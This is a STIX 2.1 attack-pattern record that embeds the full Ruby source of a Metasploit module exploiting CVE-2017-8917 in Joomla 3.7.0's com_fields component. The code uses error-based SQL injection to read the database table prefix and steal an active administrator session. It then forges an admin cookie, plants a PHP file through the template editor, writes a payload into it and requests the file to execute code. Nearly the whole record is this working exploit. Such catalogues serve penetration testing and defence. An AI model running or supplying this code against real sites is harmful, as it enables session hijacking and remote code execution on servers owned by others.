{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--85284b89-21cd-40d2-80bc-a5348aa8aca0",
    "created": "2024-08-14T17:12:00.614952Z",
    "modified": "2024-08-14T17:12:00.614955Z",
    "name": "Joomla Component Fields SQLi Remote Code Execution",
    "description": " This module exploits a SQL injection vulnerability in the com_fields component, which was introduced to the core of Joomla in version 3.7.0.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/joomla_comfields_sqli_rce.rb",
            "external_id": "joomla_comfields_sqli_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HTTP::Joomla\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Joomla Component Fields SQLi Remote Code Execution',\n      'Description'    => %q{\n        This module exploits a SQL injection vulnerability in the com_fields\n        component, which was introduced to the core of Joomla in version 3.7.0.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Mateus Lino', # Vulnerability discovery\n          'luisco100 <luisco100[at]gmail.com>' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2017-8917' ], # SQLi\n          [ 'EDB', '42033' ],\n          [ 'URL', 'https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html' ]\n        ],\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          # Arbitrary big number. The payload gets sent as POST data, so\n          # really it's unlimited\n          'Space'       => 262144, # 256k\n        },\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          [ 'Joomla 3.7.0', {} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2017-05-17',\n      'DefaultTarget'  => 0))\n\n  end\n\n  def check\n    # Request using a non-existing table\n    val = sqli(rand_text_alphanumeric(rand(10)+6), 'check')\n\n    if val.nil?\n      return Exploit::CheckCode::Safe\n    else\n      return Exploit::CheckCode::Vulnerable\n    end\n  end\n\n\n  def sqli(tableprefix, option)\n    # SQLi will grab Super User or Administrator sessions with a valid username and userid (else they are not logged in).\n    # The extra search for userid!=0 is because of our SQL data that's inserted in the session cookie history.\n    # This way we make sure that's excluded and we only get real Administrator or Super User sessions.\n    if option == 'check'\n      start = rand_text_alpha(5)\n      start_h = start.unpack('H*')[0]\n      fin = rand_text_alpha(5)\n      fin_h = fin.unpack('H*')[0]\n\n      sql = \"(UPDATEXML(2170,CONCAT(0x2e,0x#{start_h},(SELECT MID((IFNULL(CAST(TO_BASE64(table_name) AS CHAR),0x20)),1,22) FROM information_schema.tables order by update_time DESC LIMIT 1),0x#{fin_h}),4879))\"\n    else\n      start = rand_text_alpha(3)\n      start_h = start.unpack('H*')[0]\n      fin = rand_text_alpha(3)\n      fin_h = fin.unpack('H*')[0]\n\n      sql = \"(UPDATEXML(2170,CONCAT(0x2e,0x#{start_h},(SELECT MID(session_id,1,42) FROM #{tableprefix}session where userid!=0 LIMIT 1),0x#{fin_h}),4879))\"\n    end\n\n    # Retrieve cookies\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path, 'index.php'),\n      'vars_get' => {\n        'option' => 'com_fields',\n        'view' => 'fields',\n        'layout'=> 'modal',\n        'list[fullordering]' => sql\n        }\n      })\n\n    if res && res.code == 500 && res.body =~ /#{start}(.*)#{fin}/\n      return $1\n    end\n    return nil\n  end\n\n\n  def exploit\n    # Request using a non-existing table first, to retrieve the table prefix\n    val = sqli(rand_text_alphanumeric(rand(10)+6), 'check')\n    if val.nil?\n      fail_with(Failure::Unknown, \"#{peer} - Error retrieving table prefix\")\n    else\n      table_prefix = Base64.decode64(val)\n      table_prefix.sub! '_session', ''\n      print_status(\"#{peer} - Retrieved table prefix [ #{table_prefix} ]\")\n    end\n\n    # Retrieve the admin session using our retrieved table prefix\n    val = sqli(\"#{table_prefix}_\", 'exploit')\n    if val.nil?\n      fail_with(Failure::Unknown, \"#{peer}: No logged-in Administrator or Super User user found!\")\n    else\n      auth_cookie_part = val\n      print_status(\"#{peer} - Retrieved cookie [ #{auth_cookie_part} ]\")\n    end\n\n    # Retrieve cookies\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path, 'administrator', 'index.php')\n    })\n\n    if res && res.code == 200 && res.get_cookies =~ /^([a-z0-9]+)=[a-z0-9]+;/\n      cookie_begin = $1\n      print_status(\"#{peer} - Retrieved unauthenticated cookie [ #{cookie_begin} ]\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Error retrieving unauthenticated cookie\")\n    end\n\n    # Modify cookie to authenticated admin\n    auth_cookie = cookie_begin\n    auth_cookie << '='\n    auth_cookie << auth_cookie_part\n    auth_cookie << ';'\n\n    # Authenticated session\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path, 'administrator', 'index.php'),\n      'cookie'  => auth_cookie\n      })\n\n    if res && res.code == 200 && res.body =~ /Control Panel -(.*?)- Administration/\n      print_good(\"#{peer} - Successfully authenticated\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Session failure\")\n    end\n\n    # Retrieve template view\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path, 'administrator', 'index.php'),\n      'cookie'  => auth_cookie,\n      'vars_get' => {\n        'option' => 'com_templates',\n        'view' => 'templates'\n        }\n      })\n\n    # We try to retrieve and store the first template found\n    if res && res.code == 200 && res.body =~ /\\/administrator\\/index.php\\?option=com_templates&amp;view=template&amp;id=([0-9]+)&amp;file=([a-zA-Z0-9=]+)/\n      template_id = $1\n      file_id = $2\n\n      form = res.body.split(/<form action=([^\\>]+) method=\"post\" name=\"adminForm\" id=\"adminForm\"\\>(.*)<\\/form>/mi)\n      input_hidden = form[2].split(/<input type=\"hidden\"([^\\>]+)\\/>/mi)\n      input_id = input_hidden[7].split(\"\\\"\")\n      input_id = input_id[1]\n\n    else\n      fail_with(Failure::Unknown, \"Unable to retrieve template\")\n    end\n\n\n\n    filename = rand_text_alphanumeric(rand(10)+6)\n    # Create file\n    print_status(\"#{peer} - Creating file [ #{filename}.php ]\")\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path, 'administrator', 'index.php'),\n      'cookie'  => auth_cookie,\n      'vars_get' => {\n        'option' => 'com_templates',\n        'task' => 'template.createFile',\n        'id' => template_id,\n        'file' => file_id,\n        },\n      'vars_post' => {\n        'type' => 'php',\n        'address' => '',\n        input_id => '1',\n        'name' => filename\n      }\n      })\n\n    # Grab token\n    if res && res.code == 303 && res.headers['Location']\n      location = res.headers['Location']\n      print_status(\"#{peer} - Following redirect to [ #{location} ]\")\n      res = send_request_cgi(\n        'uri'    => location,\n        'method' => 'GET',\n        'cookie' => auth_cookie\n      )\n\n      # Retrieving template token\n      if res && res.code == 200 && res.body =~ /&amp;([a-z0-9]+)=1\\\">/\n        token = $1\n        print_status(\"#{peer} - Token [ #{token} ] retrieved\")\n      else\n        fail_with(Failure::Unknown, \"#{peer} - Retrieving token failed\")\n      end\n\n      if res && res.code == 200 && res.body =~ /(\\/templates\\/.*\\/)template_preview.png/\n        template_path = $1\n        print_status(\"#{peer} - Template path [ #{template_path} ] retrieved\")\n      else\n        fail_with(Failure::Unknown, \"#{peer} - Unable to retrieve template path\")\n      end\n\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Creating file failed\")\n    end\n\n    filename_base64 = Rex::Text.encode_base64(\"/#{filename}.php\")\n\n    # Inject payload data into file\n    print_status(\"#{peer} - Insert payload into file [ #{filename}.php ]\")\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path, \"administrator\", \"index.php\"),\n      'cookie'  => auth_cookie,\n      'vars_get' => {\n        'option' => 'com_templates',\n        'view' => 'template',\n        'id' => template_id,\n        'file' => filename_base64,\n        },\n      'vars_post' => {\n        'jform[source]' => payload.encoded,\n        'task' => 'template.apply',\n        token => '1',\n        'jform[extension_id]' => template_id,\n        'jform[filename]' => \"/#{filename}.php\"\n      }\n      })\n\n    if res && res.code == 303 && res.headers['Location'] =~ /\\/administrator\\/index.php\\?option=com_templates&view=template&id=#{template_id}&file=/\n      print_status(\"#{peer} - Payload data inserted into [ #{filename}.php ]\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Could not insert payload into file [ #{filename}.php ]\")\n    end\n\n    # Request payload\n    register_files_for_cleanup(\"#{filename}.php\")\n    print_status(\"#{peer} - Executing payload\")\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path, template_path, \"#{filename}.php\"),\n      'cookie'  => auth_cookie\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-05-17",
    "x_mitre_platforms": [
        "['php']"
    ]
}